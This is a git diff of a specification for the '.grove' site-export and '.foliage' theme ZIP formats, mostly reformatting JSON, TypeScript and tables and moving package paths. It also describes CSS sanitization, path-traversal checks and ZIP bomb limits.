@@ -4,7 +4,7 @@ description: Custom ZIP-based file formats for portable Grove exports and theme 
 category: specs
 specCategory: platform-services
 icon: filearchive
-lastUpdated: '2026-02-05'
+lastUpdated: "2026-02-05"
 aliases: []
 tags:
   - export
@@ -41,7 +41,7 @@ tags:
             carry your grove with you, wherever you go
 ```
 
-> *A grove is more than data—it's a place you've made your own. These formats let you hold it, share it, and replant it anywhere.*
+> _A grove is more than data—it's a place you've made your own. These formats let you hold it, share it, and replant it anywhere._
 
 Two ZIP-based file formats that give the Grove ecosystem identity and portability: **`.grove`** for exporting and importing an entire Grove (posts, pages, media, settings, curios, theme), and **`.foliage`** for packaging and sharing themes. Plus a public web viewer and standard format conversion for the open web.
 
@@ -68,23 +68,23 @@ Two ZIP-based file formats that give the Grove ecosystem identity and portabilit
 
 ## Overview
 
-| | |
-|---|---|
-| **Internal Name** | GroveFormats |
-| **Public Name** | Grove File Formats |
-| **Package** | `@autumnsgrove/grove-format` |
-| **Location** | `packages/grove-format/` |
-| **Dependencies** | fflate, existing Foliage types |
-| **Status** | Specification |
+|                   |                                |
+| ----------------- | ------------------------------ |
+| **Internal Name** | GroveFormats                   |
+| **Public Name**   | Grove File Formats             |
+| **Package**       | `@autumnsgrove/grove-format`   |
+| **Location**      | `libs/grove-format/`       |
+| **Dependencies**  | fflate, existing Foliage types |
+| **Status**        | Specification                  |
 
 ### What This Covers
 
-| System | Purpose |
-|--------|---------|
-| **`.grove`** | Full Grove export — posts, pages, media, settings, theme, curios |
-| **`.foliage`** | Theme package — colors, fonts, layout, custom CSS, preview assets |
-| **`grove.place/open`** | Client-side web viewer for browsing .grove and .foliage files |
-| **Standard formats** | Convert .grove to Markdown+Media ZIP and HTML archive |
+| System                 | Purpose                                                           |
+| ---------------------- | ----------------------------------------------------------------- |
+| **`.grove`**           | Full Grove export — posts, pages, media, settings, theme, curios  |
+| **`.foliage`**         | Theme package — colors, fonts, layout, custom CSS, preview assets |
+| **`grove.place/open`** | Client-side web viewer for browsing .grove and .foliage files     |
+| **Standard formats**   | Convert .grove to Markdown+Media ZIP and HTML archive             |
 
 ### Why Custom Formats?
 
@@ -109,13 +109,13 @@ These formats aren't proprietary walls — they're ZIP archives anyone can open.
 
 ### File Extension & MIME Type
 
-| Property | Value |
-|----------|-------|
-| **Extension** | `.grove` |
-| **MIME type (interim)** | `application/x-grove` |
-| **MIME type (future)** | `application/vnd.autumnsgrove.grove` (pending IANA registration) |
-| **Magic bytes** | Standard ZIP: `PK\x03\x04` |
-| **Max file size** | 2 GB (practical limit for R2 media) |
+| Property                | Value                                                            |
+| ----------------------- | ---------------------------------------------------------------- |
+| **Extension**           | `.grove`                                                         |
+| **MIME type (interim)** | `application/x-grove`                                            |
+| **MIME type (future)**  | `application/vnd.autumnsgrove.grove` (pending IANA registration) |
+| **Magic bytes**         | Standard ZIP: `PK\x03\x04`                                       |
+| **Max file size**       | 2 GB (practical limit for R2 media)                              |
 
 ### Internal Structure
 
@@ -160,49 +160,49 @@ The `manifest.grove` file is stored as the first entry in the ZIP with `STORED` 
 
 ```json
 {
-  "format": "grove",
-  "formatVersion": "1.0.0",
-  "minReaderVersion": "1.0.0",
-  "generatedBy": "grove-format/1.0.0",
-  "createdAt": "2026-02-05T18:30:00.000Z",
+	"format": "grove",
+	"formatVersion": "1.0.0",
+	"minReaderVersion": "1.0.0",
+	"generatedBy": "grove-format/1.0.0",
+	"createdAt": "2026-02-05T18:30:00.000Z",
 
-  "grove": {
-    "subdomain": "autumn",
-    "displayName": "Autumn's Grove",
-    "plan": "oak"
-  },
+	"grove": {
+		"subdomain": "autumn",
+		"displayName": "Autumn's Grove",
+		"plan": "oak"
+	},
 
-  "contents": {
-    "posts": 47,
-    "pages": 5,
-    "mediaFiles": 132,
-    "mediaBytes": 48291840,
-    "customFonts": 2,
-    "curios": ["timeline", "gallery"]
-  },
+	"contents": {
+		"posts": 47,
+		"pages": 5,
+		"mediaFiles": 132,
+		"mediaBytes": 48291840,
+		"customFonts": 2,
+		"curios": ["timeline", "gallery"]
+	},
 
-  "checksums": {
-    "algorithm": "sha256",
-    "manifest": "a1b2c3...",
-    "contentIndex": "d4e5f6..."
-  }
+	"checksums": {
+		"algorithm": "sha256",
+		"manifest": "a1b2c3...",
+		"contentIndex": "d4e5f6..."
+	}
 }
 ```
 
-| Field | Type | Required | Description |
-|-------|------|----------|-------------|
-| `format` | `string` | Yes | Always `"grove"` |
-| `formatVersion` | `string` | Yes | Semantic version of the .grove format |
-| `minReaderVersion` | `string` | Yes | Minimum reader version needed to parse this file |
-| `generatedBy` | `string` | Yes | Tool and version that created this file |
-| `createdAt` | `string` | Yes | ISO 8601 timestamp |
-| `grove.subdomain` | `string` | Yes | Original subdomain (for display, not enforced on import) |
-| `grove.displayName` | `string` | Yes | Human-readable grove name |
-| `grove.plan` | `string` | Yes | Subscription tier at export time |
-| `contents.*` | `object` | Yes | Content counts for quick preview |
-| `checksums.algorithm` | `string` | Yes | Hash algorithm used (always `sha256`) |
-| `checksums.manifest` | `string` | Yes | Hash of the manifest itself (excluding this field) |
-| `checksums.contentIndex` | `string` | No | Hash of the content index for integrity verification |
+| Field                    | Type     | Required | Description                                              |
+| ------------------------ | -------- | -------- | -------------------------------------------------------- |
+| `format`                 | `string` | Yes      | Always `"grove"`                                         |
+| `formatVersion`          | `string` | Yes      | Semantic version of the .grove format                    |
+| `minReaderVersion`       | `string` | Yes      | Minimum reader version needed to parse this file         |
+| `generatedBy`            | `string` | Yes      | Tool and version that created this file                  |
+| `createdAt`              | `string` | Yes      | ISO 8601 timestamp                                       |
+| `grove.subdomain`        | `string` | Yes      | Original subdomain (for display, not enforced on import) |
+| `grove.displayName`      | `string` | Yes      | Human-readable grove name                                |
+| `grove.plan`             | `string` | Yes      | Subscription tier at export time                         |
+| `contents.*`             | `object` | Yes      | Content counts for quick preview                         |
+| `checksums.algorithm`    | `string` | Yes      | Hash algorithm used (always `sha256`)                    |
+| `checksums.manifest`     | `string` | Yes      | Hash of the manifest itself (excluding this field)       |
+| `checksums.contentIndex` | `string` | No       | Hash of the content index for integrity verification     |
 
 ### Post Frontmatter
 
@@ -230,20 +230,20 @@ Welcome to my grove! This is where I write about...
 ![A sunrise over the mountains](../media/photos/sunrise.webp)
 ```
 
-| Frontmatter Field | Type | Source Column | Notes |
-|-------------------|------|---------------|-------|
-| `slug` | `string` | `posts.slug` | URL-safe identifier |
-| `title` | `string` | `posts.title` | |
-| `description` | `string?` | `posts.description` | |
-| `status` | `string` | `posts.status` | `draft`, `published`, `archived` |
-| `tags` | `string[]` | `posts.tags` (parsed from JSON) | |
-| `featuredImage` | `string?` | `posts.featured_image` | Rewritten to relative path |
-| `wordCount` | `number` | `posts.word_count` | |
-| `readingTime` | `number` | `posts.reading_time` | Minutes |
-| `gutterContent` | `object[]?` | `posts.gutter_content` (parsed) | Preserved for round-trip |
-| `publishedAt` | `string?` | `posts.published_at` | ISO 8601 |
-| `createdAt` | `string` | `posts.created_at` | ISO 8601 |
-| `updatedAt` | `string` | `posts.updated_at` | ISO 8601 |
+| Frontmatter Field | Type        | Source Column                   | Notes                            |
+| ----------------- | ----------- | ------------------------------- | -------------------------------- |
+| `slug`            | `string`    | `posts.slug`                    | URL-safe identifier              |
+| `title`           | `string`    | `posts.title`                   |                                  |
+| `description`     | `string?`   | `posts.description`             |                                  |
+| `status`          | `string`    | `posts.status`                  | `draft`, `published`, `archived` |
+| `tags`            | `string[]`  | `posts.tags` (parsed from JSON) |                                  |
+| `featuredImage`   | `string?`   | `posts.featured_image`          | Rewritten to relative path       |
+| `wordCount`       | `number`    | `posts.word_count`              |                                  |
+| `readingTime`     | `number`    | `posts.reading_time`            | Minutes                          |
+| `gutterContent`   | `object[]?` | `posts.gutter_content` (parsed) | Preserved for round-trip         |
+| `publishedAt`     | `string?`   | `posts.published_at`            | ISO 8601                         |
+| `createdAt`       | `string`    | `posts.created_at`              | ISO 8601                         |
+| `updatedAt`       | `string`    | `posts.updated_at`              | ISO 8601                         |
 
 ### Page Frontmatter
 
@@ -263,17 +263,17 @@ updatedAt: 2026-01-20T14:15:00.000Z
 I'm a writer, maker, and digital gardener...
 ```
 
-| Frontmatter Field | Type | Source Column | Notes |
-|-------------------|------|---------------|-------|
-| `slug` | `string` | `pages.slug` | |
-| `title` | `string` | `pages.title` | |
-| `description` | `string?` | `pages.description` | |
-| `type` | `string` | `pages.type` | Default `"page"` |
-| `font` | `string` | `pages.font` | Default `"default"` |
-| `hero` | `object?` | `pages.hero` (parsed from JSON) | Hero configuration |
-| `gutterContent` | `object[]` | `pages.gutter_content` (parsed) | |
-| `createdAt` | `string` | `pages.created_at` | ISO 8601 |
-| `updatedAt` | `string` | `pages.updated_at` | ISO 8601 |
+| Frontmatter Field | Type       | Source Column                   | Notes               |
+| ----------------- | ---------- | ------------------------------- | ------------------- |
+| `slug`            | `string`   | `pages.slug`                    |                     |
+| `title`           | `string`   | `pages.title`                   |                     |
+| `description`     | `string?`  | `pages.description`             |                     |
+| `type`            | `string`   | `pages.type`                    | Default `"page"`    |
+| `font`            | `string`   | `pages.font`                    | Default `"default"` |
+| `hero`            | `object?`  | `pages.hero` (parsed from JSON) | Hero configuration  |
+| `gutterContent`   | `object[]` | `pages.gutter_content` (parsed) |                     |
+| `createdAt`       | `string`   | `pages.created_at`              | ISO 8601            |
+| `updatedAt`       | `string`   | `pages.updated_at`              | ISO 8601            |
 
 ### Media Handling
 
@@ -289,29 +289,29 @@ A media index is stored alongside the files for import reconstruction:
 ```json
 // media/.index.json
 [
-  {
-    "filename": "hero.jpg",
-    "originalName": "my-photo.jpg",
-    "path": "hero.jpg",
-    "size": 245760,
-    "mimeType": "image/jpeg",
-    "altText": "A sunset over rolling hills",
-    "width": 1920,
-    "height": 1080,
-    "uploadedAt": "2026-01-12T16:00:00.000Z"
-  }
+	{
+		"filename": "hero.jpg",
+		"originalName": "my-photo.jpg",
+		"path": "hero.jpg",
+		"size": 245760,
+		"mimeType": "image/jpeg",
+		"altText": "A sunset over rolling hills",
+		"width": 1920,
+		"height": 1080,
+		"uploadedAt": "2026-01-12T16:00:00.000Z"
+	}
 ]
 ```
 
 #### URL Rewriting Rules
 
-| Context | Pattern | Replacement |
-|---------|---------|-------------|
-| Post markdown body | `https://media.grove.place/{tenant}/*` | `../media/*` |
-| Post `featuredImage` | Absolute R2 URL | `../media/{filename}` |
-| Page markdown body | Same as posts | `../media/*` |
-| Page `hero` JSON | Absolute R2 URL | `../media/{filename}` |
-| Theme `thumbnail` | Absolute R2 URL | `thumbnail.png` (in `theme/`) |
+| Context              | Pattern                                | Replacement                   |
+| -------------------- | -------------------------------------- | ----------------------------- |
+| Post markdown body   | `https://media.grove.place/{tenant}/*` | `../media/*`                  |
+| Post `featuredImage` | Absolute R2 URL                        | `../media/{filename}`         |
+| Page markdown body   | Same as posts                          | `../media/*`                  |
+| Page `hero` JSON     | Absolute R2 URL                        | `../media/{filename}`         |
+| Theme `thumbnail`    | Absolute R2 URL                        | `thumbnail.png` (in `theme/`) |
 
 On import, the reverse happens — relative paths are resolved against the new tenant's media upload path.
 
@@ -320,19 +320,19 @@ On import, the reverse happens — relative paths are resolved against the new t
 ```json
 // settings/site.json
 {
-  "title": "Autumn's Grove",
-  "description": "A place to write and think out loud",
-  "socialLinks": {
-    "github": "https://github.com/autumn",
-    "mastodon": "https://mastodon.social/@autumn"
-  },
-  "navigation": [
-    { "label": "About", "href": "/about" },
-    { "label": "Now", "href": "/now" }
-  ],
-  "accentColor": "#4a7c59",
-  "customDomain": null,
-  "timezone": "America/Chicago"
+	"title": "Autumn's Grove",
+	"description": "A place to write and think out loud",
+	"socialLinks": {
+		"github": "https://github.com/autumn",
+		"mastodon": "https://mastodon.social/@autumn"
+	},
+	"navigation": [
+		{ "label": "About", "href": "/about" },
+		{ "label": "Now", "href": "/now" }
+	],
+	"accentColor": "#4a7c59",
+	"customDomain": null,
+	"timezone": "America/Chicago"
 }
 ```
 
@@ -343,17 +343,17 @@ Settings are exported from `tenant_settings` (key-value pairs) and flattened int
 ```json
 // settings/curios.json
 {
-  "timeline": {
-    "enabled": true,
-    "voicePreset": "professional",
-    "customSystemPrompt": null,
-    "openrouterModel": "deepseek/deepseek-v3.2"
-  },
-  "gallery": {
-    "enabled": true,
-    "layout": "masonry",
-    "columns": 3
-  }
+	"timeline": {
+		"enabled": true,
+		"voicePreset": "professional",
+		"customSystemPrompt": null,
+		"openrouterModel": "deepseek/deepseek-v3.2"
+	},
+	"gallery": {
+		"enabled": true,
+		"layout": "masonry",
+		"columns": 3
+	}
 }
 ```
 
@@ -361,30 +361,30 @@ Curio configs are exported from their respective `*_curio_config` tables. **Encr
 
 ### What's Included vs. Excluded
 
-| Included | Excluded |
-|----------|----------|
-| Posts (markdown + metadata) | Auth tokens, session data |
-| Pages (markdown + metadata) | Billing information, Stripe IDs |
-| Media files (actual binaries) | Encrypted API keys in curio configs |
-| Theme settings (colors, fonts, CSS) | User email (beyond display name) |
-| Site settings (title, nav, social links) | Password hashes |
-| Curio configurations (non-secret) | Audit logs |
-| Custom fonts (WOFF2 files) | Rate limit counters |
-| Gutter content | Feature flag overrides |
-| Display name | Other tenants' data |
+| Included                                 | Excluded                            |
+| ---------------------------------------- | ----------------------------------- |
+| Posts (markdown + metadata)              | Auth tokens, session data           |
+| Pages (markdown + metadata)              | Billing information, Stripe IDs     |
+| Media files (actual binaries)            | Encrypted API keys in curio configs |
+| Theme settings (colors, fonts, CSS)      | User email (beyond display name)    |
+| Site settings (title, nav, social links) | Password hashes                     |
+| Curio configurations (non-secret)        | Audit logs                          |
+| Custom fonts (WOFF2 files)               | Rate limit counters                 |
+| Gutter content                           | Feature flag overrides              |
+| Display name                             | Other tenants' data                 |
 
 ### Export Info
 
 ```json
 // metadata/export-info.json
 {
-  "exportedAt": "2026-02-05T18:30:00.000Z",
-  "engineVersion": "2.4.1",
-  "formatLibraryVersion": "1.0.0",
-  "exportType": "full",
-  "exportDurationMs": 4200,
-  "tenantPlan": "oak",
-  "environment": "production"
+	"exportedAt": "2026-02-05T18:30:00.000Z",
+	"engineVersion": "2.4.1",
+	"formatLibraryVersion": "1.0.0",
+	"exportType": "full",
+	"exportDurationMs": 4200,
+	"tenantPlan": "oak",
+	"environment": "production"
 }
 ```
 
@@ -394,13 +394,13 @@ Curio configs are exported from their respective `*_curio_config` tables. **Encr
 
 ### File Extension & MIME Type
 
-| Property | Value |
-|----------|-------|
-| **Extension** | `.foliage` |
-| **MIME type (interim)** | `application/x-foliage` |
-| **MIME type (future)** | `application/vnd.autumnsgrove.foliage` (pending IANA registration) |
-| **Magic bytes** | Standard ZIP: `PK\x03\x04` |
-| **Max file size** | 20 MB (themes are lightweight — fonts are the heaviest part) |
+| Property                | Value                                                              |
+| ----------------------- | ------------------------------------------------------------------ |
+| **Extension**           | `.foliage`                                                         |
+| **MIME type (interim)** | `application/x-foliage`                                            |
+| **MIME type (future)**  | `application/vnd.autumnsgrove.foliage` (pending IANA registration) |
+| **Magic bytes**         | Standard ZIP: `PK\x03\x04`                                         |
+| **Max file size**       | 20 MB (themes are lightweight — fonts are the heaviest part)       |
 
 ### Internal Structure
 
@@ -428,46 +428,46 @@ my-theme.foliage
 
 ```json
 {
-  "format": "foliage",
-  "formatVersion": "1.0.0",
-  "minReaderVersion": "1.0.0",
-  "generatedBy": "grove-format/1.0.0",
-  "createdAt": "2026-02-05T18:30:00.000Z",
+	"format": "foliage",
+	"formatVersion": "1.0.0",
+	"minReaderVersion": "1.0.0",
+	"generatedBy": "grove-format/1.0.0",
+	"createdAt": "2026-02-05T18:30:00.000Z",
 
-  "theme": {
-    "id": "cozy-cabin",
-    "name": "Cozy Cabin",
-    "description": "Warm browns and intimate spacing — like writing by firelight",
-    "tags": ["warm", "cozy", "dark", "intimate"],
-    "baseTheme": "grove"
-  },
+	"theme": {
+		"id": "cozy-cabin",
+		"name": "Cozy Cabin",
+		"description": "Warm browns and intimate spacing — like writing by firelight",
+		"tags": ["warm", "cozy", "dark", "intimate"],
+		"baseTheme": "grove"
+	},
 
-  "contents": {
-    "hasCustomCSS": true,
-    "customCSSBytes": 2048,
-    "customFonts": 1,
-    "screenshots": 3,
-    "hasThumbnail": true
-  },
+	"contents": {
+		"hasCustomCSS": true,
+		"customCSSBytes": 2048,
+		"customFonts": 1,
+		"screenshots": 3,
+		"hasThumbnail": true
+	},
 
-  "checksums": {
-    "algorithm": "sha256",
-    "manifest": "f1e2d3..."
-  }
+	"checksums": {
+		"algorithm": "sha256",
+		"manifest": "f1e2d3..."
+	}
 }
 ```
 
-| Field | Type | Required | Description |
-|-------|------|----------|-------------|
-| `format` | `string` | Yes | Always `"foliage"` |
-| `formatVersion` | `string` | Yes | Semantic version of the .foliage format |
-| `minReaderVersion` | `string` | Yes | Minimum reader version to parse |
-| `theme.id` | `string` | Yes | Unique theme identifier (kebab-case) |
-| `theme.name` | `string` | Yes | Human-readable theme name |
-| `theme.description` | `string` | Yes | Short description (max 200 chars) |
-| `theme.tags` | `string[]` | Yes | Searchable tags (max 10) |
-| `theme.baseTheme` | `string?` | No | Parent theme ID if this is a variant |
-| `contents.*` | `object` | Yes | Content summary |
+| Field               | Type       | Required | Description                             |
+| ------------------- | ---------- | -------- | --------------------------------------- |
+| `format`            | `string`   | Yes      | Always `"foliage"`                      |
+| `formatVersion`     | `string`   | Yes      | Semantic version of the .foliage format |
+| `minReaderVersion`  | `string`   | Yes      | Minimum reader version to parse         |
+| `theme.id`          | `string`   | Yes      | Unique theme identifier (kebab-case)    |
+| `theme.name`        | `string`   | Yes      | Human-readable theme name               |
+| `theme.description` | `string`   | Yes      | Short description (max 200 chars)       |
+| `theme.tags`        | `string[]` | Yes      | Searchable tags (max 10)                |
+| `theme.baseTheme`   | `string?`  | No       | Parent theme ID if this is a variant    |
+| `contents.*`        | `object`   | Yes      | Content summary                         |
 
 ### Theme Object (`theme.json`)
 
@@ -475,45 +475,45 @@ The full theme definition, matching the Foliage type system:
 
 ```json
 {
-  "id": "cozy-cabin",
-  "name": "Cozy Cabin",
-  "description": "Warm browns and intimate spacing — like writing by firelight",
-  "thumbnail": "preview/thumbnail.png",
-  "tier": "sapling",
+	"id": "cozy-cabin",
+	"name": "Cozy Cabin",
+	"description": "Warm browns and intimate spacing — like writing by firelight",
+	"thumbnail": "preview/thumbnail.png",
+	"tier": "sapling",
 
-  "colors": {
-    "background": "#2a1f1a",
-    "surface": "#3d2e25",
-    "foreground": "#e8ddd4",
-    "foregroundMuted": "#b8a99e",
-    "accent": "#d4915e",
-    "border": "#5a4a3f"
-  },
+	"colors": {
+		"background": "#2a1f1a",
+		"surface": "#3d2e25",
+		"foreground": "#e8ddd4",
+		"foregroundMuted": "#b8a99e",
+		"accent": "#d4915e",
+		"border": "#5a4a3f"
+	},
 
-  "fonts": {
-    "heading": "Lora",
-    "body": "Lexend",
-    "mono": "JetBrains Mono"
-  },
+	"fonts": {
+		"heading": "Lora",
+		"body": "Lexend",
+		"mono": "JetBrains Mono"
+	},
 
-  "layout": {
-    "type": "sidebar",
-    "maxWidth": "72rem",
-    "spacing": "comfortable"
-  },
+	"layout": {
+		"type": "sidebar",
+		"maxWidth": "72rem",
+		"spacing": "comfortable"
+	},
 
-  "glass": {
-    "enabled": true,
-    "opacity": 0.6,
-    "blur": 12
-  },
+	"glass": {
+		"enabled": true,
+		"opacity": 0.6,
+		"blur": 12
+	},
 
-  "seasonal": {
-    "enabled": false,
-    "variants": {}
-  },
+	"seasonal": {
+		"enabled": false,
+		"variants": {}
+	},
 
-  "customCSS": "custom-css/styles.css"
+	"customCSS": "custom-css/styles.css"
 }
 ```
 
@@ -522,18 +522,21 @@ The full theme definition, matching the Foliage type system:
 Every `.foliage` file is validated on both creation and import:
 
 #### Color Contrast (WCAG AA)
+
 - `foreground` on `background`: minimum 4.5:1 ratio for body text
 - `foreground` on `surface`: minimum 4.5:1 ratio
 - `accent` on `background`: minimum 3:1 ratio for large text / interactive elements
 - Validation uses relative luminance calculation per WCAG 2.1
 
 #### CSS Sanitization
+
 - Maximum 10 KB
 - Reuses Foliage's `validateCustomCSS()` function
 - Blocked patterns: `@import`, `url()` with external domains, `expression()`, `javascript:`, `behavior:`, `-moz-binding`
 - Allowed `url()` targets: only relative paths within the archive (`fonts/`, `preview/`)
 
 #### Font Validation
+
 - WOFF2 format required (WOFF optional fallback)
 - Maximum 500 KB per font file
 - Maximum 5 custom fonts per theme
@@ -541,6 +544,7 @@ Every `.foliage` file is validated on both creation and import:
 - Reuses Foliage's `validateWoff2()` function
 
 #### Image Validation
+
 - Thumbnail required: PNG or WebP, 1200×630 pixels
 - Screenshots optional: PNG or WebP, max 1920×1080, max 5 screenshots
 - Maximum 2 MB per image
@@ -551,9 +555,9 @@ Every `.foliage` file is validated on both creation and import:
 ```json
 // metadata/author.json
 {
-  "displayName": "Autumn",
-  "groveUrl": "https://autumn.grove.place",
-  "createdAt": "2026-02-05T18:30:00.000Z"
+	"displayName": "Autumn",
+	"groveUrl": "https://autumn.grove.place",
+	"createdAt": "2026-02-05T18:30:00.000Z"
 }
 ```
 
@@ -564,27 +568,27 @@ No email, user ID, or private information — only what the creator chooses to d
 ```json
 // metadata/compatibility.json
 {
-  "minFoliageVersion": "1.0.0",
-  "minTier": "sapling",
-  "requiresCustomFonts": false,
-  "requiresCustomCSS": true,
-  "requiresGlass": true,
-  "terrarium": {
-    "compatible": false,
-    "sceneData": null
-  }
+	"minFoliageVersion": "1.0.0",
+	"minTier": "sapling",
+	"requiresCustomFonts": false,
+	"requiresCustomCSS": true,
+	"requiresGlass": true,
+	"terrarium": {
+		"compatible": false,
+		"sceneData": null
+	}
 }
 ```
 
-| Field | Description |
-|-------|-------------|
-| `minFoliageVersion` | Minimum Foliage library version to render this theme |
-| `minTier` | Lowest subscription tier that can use this theme |
-| `requiresCustomFonts` | Whether the theme depends on included WOFF2 files |
-| `requiresCustomCSS` | Whether the theme depends on `custom-css/styles.css` |
-| `requiresGlass` | Whether the theme uses glassmorphism effects |
-| `terrarium.compatible` | Whether this was exported from Terrarium (future) |
-| `terrarium.sceneData` | Path to Terrarium scene JSON if applicable (future) |
+| Field                  | Description                                          |
+| ---------------------- | ---------------------------------------------------- |
+| `minFoliageVersion`    | Minimum Foliage library version to render this theme |
+| `minTier`              | Lowest subscription tier that can use this theme     |
+| `requiresCustomFonts`  | Whether the theme depends on included WOFF2 files    |
+| `requiresCustomCSS`    | Whether the theme depends on `custom-css/styles.css` |
+| `requiresGlass`        | Whether the theme uses glassmorphism effects         |
+| `terrarium.compatible` | Whether this was exported from Terrarium (future)    |
+| `terrarium.sceneData`  | Path to Terrarium scene JSON if applicable (future)  |
 
 ### Terrarium Integration (Future)
 
@@ -593,11 +597,11 @@ When Terrarium ships, it will export `.foliage` files containing scene compositi
 ```json
 // metadata/compatibility.json (Terrarium-exported theme)
 {
-  "terrarium": {
-    "compatible": true,
-    "sceneData": "terrarium/scene.json",
-    "terrariumVersion": "1.0.0"
-  }
+	"terrarium": {
+		"compatible": true,
+		"sceneData": "terrarium/scene.json",
+		"terrariumVersion": "1.0.0"
+	}
 }
 ```
 
@@ -638,17 +642,19 @@ Community themes stored in D1 can be exported to `.foliage` and re-imported with
 
 A public, no-auth-required page at `grove.place/open` where anyone can drag-and-drop a `.grove` or `.foliage` file to browse its contents. Everything happens client-side — files never leave the browser.
 
-**Route:** `packages/landing/src/routes/open/+page.svelte`
+**Route:** `apps/landing/src/routes/open/+page.svelte`
 
 ### Core Features
 
 #### File Input
+
 - Drag-and-drop zone (full-page on hover, targeted box otherwise)
 - File picker button as fallback
 - Accepts `.grove` and `.foliage` extensions
 - Validates magic bytes before extraction
 
 #### `.grove` Viewer
+
 - **Browse posts:** Rendered Markdown with syntax highlighting
 - **Browse pages:** Same as posts
 - **Media gallery:** Grid view of all images/media with lazy loading
@@ -657,6 +663,7 @@ A public, no-auth-required page at `grove.place/open` where anyone can drag-and-
 - **Export stats:** Counts from manifest (posts, pages, media, total size)
 
 #### `.foliage` Viewer
+
 - **Live theme preview:** Applies theme colors/fonts to sample content
 - **Color palette:** Visual swatch display of all theme colors
 - **Font preview:** Sample text rendered in theme fonts
@@ -665,6 +672,7 @@ A public, no-auth-required page at `grove.place/open` where anyone can drag-and-
 - **Compatibility badge:** Shows minimum tier, Terrarium compatibility
 
 #### Import Button
+
 - "Import to my Grove" button visible on both viewers
 - Requires authentication — clicking triggers Heartwood OAuth flow if not signed in
 - After auth, opens import confirmation dialog with:
@@ -675,32 +683,35 @@ A public, no-auth-required page at `grove.place/open` where anyone can drag-and-
 ### Technical Implementation
 
 #### Client-Side ZIP Extraction
+
 - **Library:** fflate (~8 KB gzipped) — works in Workers and browsers, supports streaming
 - **No server upload** — all extraction happens in a Web Worker to avoid blocking the main thread
 - **Progressive rendering** — content appears as it's extracted, manifest first
 - **Memory management** — large media files processed as streams, not buffered entirely
 
 #### URL Sharing
+
 - After opening a file, generate a shareable URL with format:
   `grove.place/open#type=grove&name=my-grove&posts=47&pages=5`
 - No file data in the URL — the hash just describes what was opened
 - Visitors to a shared URL see a "this person shared a .grove file" landing with instructions to get their own
 
 #### PWA File Handlers
+
 Register in the web app manifest for OS-level file association:
 
 ```json
-// packages/landing/static/manifest.json
+// apps/landing/static/manifest.json
 {
-  "file_handlers": [
-    {
-      "action": "/open",
-      "accept": {
-        "application/x-grove": [".grove"],
-        "application/x-foliage": [".foliage"]
-      }
-    }
-  ]
+	"file_handlers": [
+		{
+			"action": "/open",
+			"accept": {
+				"application/x-grove": [".grove"],
+				"application/x-foliage": [".foliage"]
+			}
+		}
+	]
 }
 ```
 
@@ -857,18 +868,18 @@ Both converters are pure functions — no side effects, no network access. They 
 
 ## Package Architecture
 
-### New Package: `packages/grove-format/`
+### New Package: `libs/grove-format/`
 
 A standalone TypeScript library (not SvelteKit) that handles all format operations. It needs to work in three environments:
 
-| Environment | Use Case |
-|-------------|----------|
+| Environment            | Use Case                                                      |
+| ---------------------- | ------------------------------------------------------------- |
 | **Cloudflare Workers** | Server-side export (`/api/export`) and import (`/api/import`) |
-| **Browser** | `grove.place/open` viewer, client-side import |
-| **CLI** | Future `gw export` and `gw import` commands |
+| **Browser**            | `grove.place/open` viewer, client-side import                 |
+| **CLI**                | Future `gw export` and `gw import` commands                   |
 
 ```
-packages/grove-format/
+libs/grove-format/
 ├── package.json
 ├── tsconfig.json
 ├── src/
@@ -906,47 +917,47 @@ packages/grove-format/
 
 ```typescript
 import {
-  // .grove operations
-  createGroveFile,
-  parseGroveFile,
-  validateGroveFile,
+	// .grove operations
+	createGroveFile,
+	parseGroveFile,
+	validateGroveFile,
 
-  // .foliage operations
-  createFoliageFile,
-  parseFoliageFile,
-  validateFoliageFile,
+	// .foliage operations
+	createFoliageFile,
+	parseFoliageFile,
+	validateFoliageFile,
 
-  // Standard format conversion
-  groveToMarkdown,
-  groveToHTML,
+	// Standard format conversion
+	groveToMarkdown,
+	groveToHTML,
 
-  // Utilities
-  isGroveFile,
-  isFoliageFile,
-  getManifest,
+	// Utilities
+	isGroveFile,
+	isFoliageFile,
+	getManifest,
 
-  // Types
-  type GroveManifest,
-  type FoliageManifest,
-  type GroveFileContents,
-  type FoliageFileContents,
-  type ParseOptions,
-  type CreateGroveOptions,
-  type CreateFoliageOptions,
-} from '@autumnsgrove/grove-format';
+	// Types
+	type GroveManifest,
+	type FoliageManifest,
+	type GroveFileContents,
+	type FoliageFileContents,
+	type ParseOptions,
+	type CreateGroveOptions,
+	type CreateFoliageOptions,
+} from "@autumnsgrove/grove-format";
 ```
 
 ### Key Dependency: fflate
 
 **Why fflate over JSZip:**
 
-| | fflate | JSZip |
-|---|---|---|
-| **Size** | ~8 KB gzipped | ~45 KB gzipped |
-| **Workers** | Full support | Requires polyfills |
-| **Streaming** | Native streaming API | Limited |
-| **Speed** | 2-5× faster | Baseline |
-| **API** | Callback/sync | Promise-based |
+|               | fflate               | JSZip              |
+| ------------- | -------------------- | ------------------ |
+| **Size**      | ~8 KB gzipped        | ~45 KB gzipped     |
+| **Workers**   | Full support         | Requires polyfills |
+| **Streaming** | Native streaming API | Limited            |
+| **Speed**     | 2-5× faster          | Baseline           |
+| **API**       | Callback/sync        | Promise-based      |
 
 fflate provides `zipSync()` / `unzipSync()` for small files and `zip()` / `unzip()` with streaming for large archives. The `STORED` compression mode (no deflate) is supported for the manifest-first pattern.
 
@@ -960,42 +971,39 @@ Every path extracted from a ZIP archive is validated:
 
 ```typescript
 function validatePath(path: string): boolean {
-  // Reject absolute paths
-  if (path.startsWith('/') || path.startsWith('\\')) return false;
+	// Reject absolute paths
+	if (path.startsWith("/") || path.startsWith("\\")) return false;
 
-  // Reject path traversal
-  if (path.includes('..')) return false;
+	// Reject path traversal
+	if (path.includes("..")) return false;
 
-  // Reject Windows-style paths
-  if (/^[a-zA-Z]:/.test(path)) return false;
+	// Reject Windows-style paths
+	if (/^[a-zA-Z]:/.test(path)) return false;
 
-  // Reject null bytes
-  if (path.includes('\0')) return false;
+	// Reject null bytes
+	if (path.includes("\0")) return false;
 
-  // Normalize and verify it stays within root
-  const normalized = path.split('/').filter(s => s !== '.' && s !== '');
-  return normalized.length > 0 && normalized.every(s => s !== '..');
+	// Normalize and verify it stays within root
+	const normalized = path.split("/").filter((s) => s !== "." && s !== "");
+	return normalized.length > 0 && normalized.every((s) => s !== "..");
 }
 ```
 
 ### ZIP Bomb Protection
 
-| Limit | Value | Rationale |
-|-------|-------|-----------|
-| Max archive size | 2 GB (.grove), 20 MB (.foliage) | Prevents storage exhaustion |
-| Max individual file | 500 MB | Largest reasonable media file |
